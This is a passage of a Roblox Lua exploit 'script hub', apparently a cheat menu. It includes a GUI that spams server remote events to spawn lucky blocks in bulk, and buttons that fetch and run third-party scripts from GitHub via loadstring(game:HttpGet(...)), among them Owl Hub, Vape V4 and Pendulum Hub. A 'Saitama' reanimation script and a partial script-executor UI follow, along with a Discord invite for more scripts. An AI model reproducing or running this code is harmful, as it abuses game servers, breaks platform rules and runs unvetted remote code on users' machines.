LuckyBlock_2.Position = UDim2.new(0.0552380905, 0, 0.223333329, 0)
LuckyBlock_2.Selectable = false
LuckyBlock_2.Size = UDim2.new(0, 150, 0, 35)
LuckyBlock_2.AutoButtonColor = false
LuckyBlock_2.Font = Enum.Font.SourceSans
LuckyBlock_2.Text = "LuckyBlock"
LuckyBlock_2.TextColor3 = Color3.fromRGB(255, 255, 255)
LuckyBlock_2.TextSize = 28.000
 
SuperBlock.Name = "SuperBlock"
SuperBlock.Parent = Frame
SuperBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SuperBlock.BorderSizePixel = 0
SuperBlock.Position = UDim2.new(0.0552381277, 0, 0.383333325, 0)
SuperBlock.Selectable = false
SuperBlock.Size = UDim2.new(0, 150, 0, 35)
SuperBlock.AutoButtonColor = false
SuperBlock.Font = Enum.Font.SourceSans
SuperBlock.Text = "SuperBlock"
SuperBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
SuperBlock.TextSize = 28.000
 
GalaxyBlock.Name = "GalaxyBlock"
GalaxyBlock.Parent = Frame
GalaxyBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
GalaxyBlock.BorderSizePixel = 0
GalaxyBlock.Position = UDim2.new(0.0552381277, 0, 0.826666653, 0)
GalaxyBlock.Selectable = false
GalaxyBlock.Size = UDim2.new(0, 150, 0, 35)
GalaxyBlock.AutoButtonColor = false
GalaxyBlock.Font = Enum.Font.SourceSans
GalaxyBlock.Text = "GalaxyBlock"
GalaxyBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GalaxyBlock.TextSize = 28.000
 
RainbowBlock.Name = "RainbowBlock"
RainbowBlock.Parent = Frame
RainbowBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
RainbowBlock.BorderSizePixel = 0
RainbowBlock.Position = UDim2.new(0.0552381277, 0, 0.679999948, 0)
RainbowBlock.Selectable = false
RainbowBlock.Size = UDim2.new(0, 150, 0, 35)
RainbowBlock.AutoButtonColor = false
RainbowBlock.Font = Enum.Font.SourceSans
RainbowBlock.Text = "RainbowBlock"
RainbowBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
RainbowBlock.TextSize = 28.000
 
DiamondBlock.Name = "DiamondBlock"
DiamondBlock.Parent = Frame
DiamondBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
DiamondBlock.BorderSizePixel = 0
DiamondBlock.Position = UDim2.new(0.0552381277, 0, 0.533333302, 0)
DiamondBlock.Selectable = false
DiamondBlock.Size = UDim2.new(0, 150, 0, 35)
DiamondBlock.AutoButtonColor = false
DiamondBlock.Font = Enum.Font.SourceSans
DiamondBlock.Text = "DiamondBlock"
DiamondBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
DiamondBlock.TextSize = 28.000
 
CopyDiscordServer.Name = "CopyDiscordServer"
CopyDiscordServer.Parent = Frame
CopyDiscordServer.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
CopyDiscordServer.BorderSizePixel = 0
CopyDiscordServer.Position = UDim2.new(0.531428576, 0, 0.826666713, 0)
CopyDiscordServer.Selectable = false
CopyDiscordServer.Size = UDim2.new(0, 194, 0, 35)
CopyDiscordServer.AutoButtonColor = false
CopyDiscordServer.Font = Enum.Font.SourceSans
CopyDiscordServer.Text = "CopyDiscordServer"
CopyDiscordServer.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyDiscordServer.TextSize = 28.000
 
DiscordServer_box.Name = "DiscordServer_box"
DiscordServer_box.Parent = Frame
DiscordServer_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DiscordServer_box.BorderSizePixel = 0
DiscordServer_box.Position = UDim2.new(0.531428576, 0, 0.709999979, 0)
DiscordServer_box.Size = UDim2.new(0, 194, 0, 35)
DiscordServer_box.ClearTextOnFocus = false
DiscordServer_box.Font = Enum.Font.SourceSans
DiscordServer_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.PlaceholderText = "https://discord.gg/TyUzMpMMUE"
DiscordServer_box.Text = "https://discord.gg/TyUzMpMMUE"
DiscordServer_box.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.TextSize = 14.000
 
lable_discord.Name = "lable_discord"
lable_discord.Parent = Frame
lable_discord.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lable_discord.BackgroundTransparency = 1.000
lable_discord.Position = UDim2.new(0.531428576, 0, 0.533333361, 0)
lable_discord.Size = UDim2.new(0, 194, 0, 53)
lable_discord.Font = Enum.Font.SourceSans
lable_discord.Text = "--You will find many other scripts in this discord server."
lable_discord.TextColor3 = Color3.fromRGB(0, 170, 0)
lable_discord.TextScaled = true
lable_discord.TextSize = 28.000
lable_discord.TextWrapped = true
 
open_box.Name = "open_box"
open_box.Parent = Frame
open_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
open_box.BorderSizePixel = 0
open_box.Position = UDim2.new(0.750476241, 0, 0.313333333, 0)
open_box.Size = UDim2.new(0, 56, 0, 35)
open_box.ClearTextOnFocus = false
open_box.Font = Enum.Font.SourceSans
open_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
open_box.PlaceholderText = "Value"
open_box.Text = "1"
open_box.TextColor3 = Color3.fromRGB(255, 255, 255)
open_box.TextSize = 28.000
open_box.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
toBox.Name = "toBox"
toBox.Parent = Frame
toBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toBox.BackgroundTransparency = 1.000
toBox.Position = UDim2.new(0.531428635, 0, 0.286666691, 0)
toBox.Size = UDim2.new(0, 194, 0, 50)
toBox.Font = Enum.Font.SourceSans
toBox.Text = "0 to "
toBox.TextColor3 = Color3.fromRGB(255, 255, 255)
toBox.TextSize = 28.000
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.Position = UDim2.new(0.400000006, 0, 0.170000002, 0)
Frame_2.Size = UDim2.new(0, 0, 0, 292)
 
close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.90054822, 0, 0.00678133965, 0)
close.Size = UDim2.new(0, 45, 0, 45)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)
 
 
----------------------------------------------------------------
 
close.MouseButton1Click:connect(function()
    Frame.Visible = false
end)
 
LuckyBlock_2.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
    end
end)
 
DiamondBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
    end
end)
 
SuperBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnSuperBlock:FireServer()
    end
end)
 
RainbowBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
    end
end)
 
GalaxyBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
    end
end)
 
CopyDiscordServer.MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/TyUzMpMMUE")
    wait(1)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Success!";
        Text = "Copy Discord: https://discord.gg/TyUzMpMMUE"; -- what the text says (ofc)
        Duration = 5;
    })
end)
end)

local OwlHub = ScriptsTab.AddButton("Owl Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)

local Saitama = ScriptsTab.AddButton("Saitama", function()
print('Saitama Made by mugaga#2801')
--Saitama
--Made by mugaga#2801
--For The Script To Execute You Need:
--https://web.roblox.com/catalog/6470135113/Fan-Hand-Sign-Why-Dont-We-WDW
--R - Main Idle
--E - Barrage
--Click - Punch
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,35,0)
wait(0.5)
end)
end
end

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Notification";
	Text = "Netless activated";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 16;
local HatChar = game.Players.LocalPlayer.Character
local Hat = HatChar:FindFirstChild("WDW_FoamFinger")

Hat.Handle.SpecialMesh:Destroy()




HumanDied = false
local reanim
function noplsmesh(hat)
_G.OldCF=workspace.Camera.CFrame
oldchar=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name][hat]:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
game.Players.LocalPlayer.Character=oldchar
wait()
workspace.Camera.CFrame=_G.OldCF
game.Players.LocalPlayer.Character=oldchar
end
_G.ClickFling=false -- Set this to true if u want.
loadstring(game:HttpGet(('https://raw.githubusercontent.com/OofHead-FE/nexo-before-deleted/main/NexoPD'),true))()

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

function hatset(yes,part,c1,c0,nm)
reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
if nm==true then
noplsmesh(yes)
end
end

--put the hat script converted below

reanim = game.Players.LocalPlayer.Character.CWExtra.NexoPD
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == 'r' then-- first mode
Mode='1'
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'urkeybind' then-- third mode
Mode='3'
end
end)



attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack0'
wait(1) -- Time Of Attack
Mode='Attack1'
end)



coroutine.wrap(function()
while true do -- anim changer
if HumanDied then mousechanger:Disconnect() break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.2*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10.4*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-33+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.5+0*math.cos(sine/13),-0.3+0*math.cos(sine/13))*ANGLES(RAD(0+3*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.2*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-10.4*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-30*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+20*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.5+0*math.cos(sine/13),-0.4+0*math.cos(sine/13))*ANGLES(RAD(34+15*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),-0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-37+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(0+3*math.cos(sine/1),1+-2*math.cos(sine/1),0+8*math.cos(sine/1))*ANGLES(RAD(130+10*math.cos(sine/1)),RAD(32+0*math.cos(sine/1)),RAD(-26+0*math.cos(sine/1))),.3)
LS.C0 = LS.C0:Lerp(CF(0+5*math.cos(sine/1),0.5+4*math.cos(sine/1),0+-7*math.cos(sine/1))*ANGLES(RAD(94+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),0+-0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(1+0*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.5+0*math.cos(sine/2),-0.6+0*math.cos(sine/2))*ANGLES(RAD(36+15*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),-0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-37+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(0+3*math.cos(sine/1),1+-2*math.cos(sine/1),0+8*math.cos(sine/1))*ANGLES(RAD(130+10*math.cos(sine/1)),RAD(32+0*math.cos(sine/1)),RAD(-26+0*math.cos(sine/1))),.3)
LS.C0 = LS.C0:Lerp(CF(0+5*math.cos(sine/1),0.5+4*math.cos(sine/1),0+-7*math.cos(sine/1))*ANGLES(RAD(94+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),0+-0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(1+0*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.5+0*math.cos(sine/2),-0.6+0*math.cos(sine/2))*ANGLES(RAD(36+15*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
elseif Mode == '3' then
if Root.Velocity.y > 1 then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
--idle clerp here
elseif Root.Velocity.Magnitude < 20 then -- walk
--walk clerp here
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
elseif Mode == 'Attack0' then
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(5+0*math.cos(sine/13)),RAD(-37+0*math.cos(sine/13)),RAD(1+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-13+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(105+0*math.cos(sine/13)),RAD(18+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(101+0*math.cos(sine/13)),RAD(18+0*math.cos(sine/13)),RAD(-44+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(18+0*math.cos(sine/13)),RAD(-51+0*math.cos(sine/13)),RAD(12+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(3+0*math.cos(sine/13)),RAD(-2+0*math.cos(sine/13)),RAD(-4+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.6+0*math.cos(sine/2),-0.5+0*math.cos(sine/2))*ANGLES(RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
elseif Mode == 'Attack1' then
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-13+0*math.cos(sine/13)),RAD(-30+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(101+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(14+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(105+0*math.cos(sine/13)),RAD(-15+0*math.cos(sine/13)),RAD(-15+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),-0.2+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13)),RAD(-11+0*math.cos(sine/13))),.3)
reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.6+0*math.cos(sine/2),-0.5+0*math.cos(sine/2))*ANGLES(RAD(21+2*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
end
srv.RenderStepped:Wait()
end
end)()

--This was copied from neptunian V
local muter = false
local ORGID = 335167645
local ORVOL = 1.15
local ORPIT = 1.01
local kan = Instance.new("Sound",char)
kan.Volume = 0
if not NoSound then
	kan.Volume = 1.15
end
kan.TimePosition = 0
kan.PlaybackSpeed = 1.01
kan.Pitch = 1.01
kan.SoundId = "rbxassetid://335167645"
kan.Name = "Saitama"
kan.Looped = true
kan:Play()
--Created using Nexo Animator
end)

local VapeV4 = ScriptsTab.AddButton("Vape V4", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

local PendulmHub = ScriptsTab.AddButton("Pendulm Hub", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua", true))()
end)

local SyntaxV2 = ScriptsTab.AddButton("Syntax V2", function()
 --Made By Zhentor

-- Instances:

local ZhentorsUI = Instance.new("ScreenGui")
local LoaderMain = Instance.new("ImageLabel")
local Top = Instance.new("ImageLabel")
local ZhentorsUI_2 = Instance.new("TextLabel")
local Holder = Instance.new("Frame")
local Bar = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Clear = Instance.new("TextButton")
local Execute = Instance.new("TextButton")
local ScrollingFrame = Instance.new("ScrollingFrame")
local EditorFrame = Instance.new("ScrollingFrame")
local Source = Instance.new("TextBox")
local Tokens_ = Instance.new("TextLabel")
local Numbers_ = Instance.new("TextLabel")
local Keywords_ = Instance.new("TextLabel")
local Globals_ = Instance.new("TextLabel")
local Strings_ = Instance.new("TextLabel")
local Comments_ = Instance.new("TextLabel")
local RemoteHighlight_ = Instance.new("TextLabel")
local Lines = Instance.new("TextLabel")
local Top_2 = Instance.new("Frame")
local Syntax = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")

--Properties:

ZhentorsUI.Name = "ZhentorsUI"
ZhentorsUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

LoaderMain.Name = "LoaderMain"
LoaderMain.Parent = ZhentorsUI
LoaderMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoaderMain.BackgroundTransparency = 1.000
LoaderMain.Position = UDim2.new(0.255708218, 0, 0.345264018, 0)
LoaderMain.Size = UDim2.new(0, 394, 0, 175)
LoaderMain.Image = "rbxassetid://3570695787"
LoaderMain.ImageColor3 = Color3.fromRGB(60, 60, 60)
LoaderMain.ScaleType = Enum.ScaleType.Slice
LoaderMain.SliceCenter = Rect.new(100, 100, 100, 100)
LoaderMain.SliceScale = 0.120

Top.Name = "Top"
Top.Parent = LoaderMain
Top.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Top.BackgroundTransparency = 1.000
Top.Size = UDim2.new(0, 394, 0, 31)
Top.Image = "rbxassetid://3570695787"
Top.ImageColor3 = Color3.fromRGB(45, 45, 45)
Top.ScaleType = Enum.ScaleType.Slice
Top.SliceCenter = Rect.new(100, 100, 100, 100)
Top.SliceScale = 0.120

ZhentorsUI_2.Name = "ZhentorsUI"
ZhentorsUI_2.Parent = Top
ZhentorsUI_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ZhentorsUI_2.BackgroundTransparency = 1.000
ZhentorsUI_2.BorderSizePixel = 0
ZhentorsUI_2.Size = UDim2.new(0, 394, 0, 31)
ZhentorsUI_2.Font = Enum.Font.GothamBlack
ZhentorsUI_2.Text = "Zhentors UI"
